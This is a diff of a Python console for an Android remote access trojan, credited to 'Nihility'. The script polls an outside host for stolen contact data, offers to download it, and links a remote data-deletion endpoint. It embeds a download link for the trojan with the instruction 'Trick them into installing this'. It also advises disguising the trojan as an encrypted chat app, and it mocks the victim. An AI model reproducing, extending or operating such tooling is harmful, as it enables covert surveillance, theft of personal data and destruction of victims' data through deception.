@@ -11,7 +11,6 @@ version = f"{RED}v0.1{RESET}"
 ar_link = f"{GREEN}https://limewire.com/d/2Rx85#zHlMLH53hJ (Trick them into installing this.){RESET}"
 delete_data = f"{GREEN}http://bluntcord.medianewsonline.com/aroid_to/delete.php{RESET}"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
-
 print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
 print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
@@ -27,7 +26,9 @@ while True:
             if content:
                 os.system('clear')
                 print(f"{GREEN}RAT got access. Proceeding...{RESET}")
+                print(f"{RED}To delete data, go to: {RESET}" + delete_data)
                 print(f"{GREEN}Content:\n {content} {RESET}")
+                print(f"{RED}To delete data, go to: {RESET}" + delete_data)
                 user_input = input("Download data? Y/N: ")
                 if user_input.strip().lower() == 'y':
                     try:
@@ -66,7 +67,7 @@ while True:
                 print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's an encrypted chatting application.{RESET}")
                 print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n                                         To wipe data, go to {RESET}" + delete_data)
         else:
-            print(f"File too large, Received status code {response.status_code}")
+            print(f"Data too large, Received status code {response.status_code}")
             user_input = input("Download content? Y/N: ")
     except Exception as e:
         print(f"Error fetching data, Content might be too large to gather. Download it.: {e}")
